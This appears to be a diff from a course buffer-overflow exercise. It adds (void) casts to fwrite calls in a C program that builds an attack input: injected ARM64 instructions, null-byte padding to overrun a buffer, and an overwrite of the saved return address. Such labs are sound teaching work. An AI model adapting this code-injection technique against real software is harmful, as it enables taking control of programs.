@@ -37,19 +37,19 @@ int main(void) {
 
     /* mov x0, 'A' */
     uiInstr = MiniAssembler_mov(0, 'A');
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* adr x1, 0x420044 */
     uiInstr = MiniAssembler_adr(1, 0x420044,0x420070);
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* strb x0, [x1] */
     uiInstr = MiniAssembler_strb(0, 1);
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* b 0x40089c */
     uiInstr = MiniAssembler_b(0x40089c, 0x420078);
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* Add nullbytes to overrun the buffer */
     for (i = 0; i < 12; i++) {
@@ -57,7 +57,7 @@ int main(void) {
     }
 
     /* Overwrite x30 with address of printf call in main */
-    fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);
 
     /* Close the file */
     fclose(psFile);
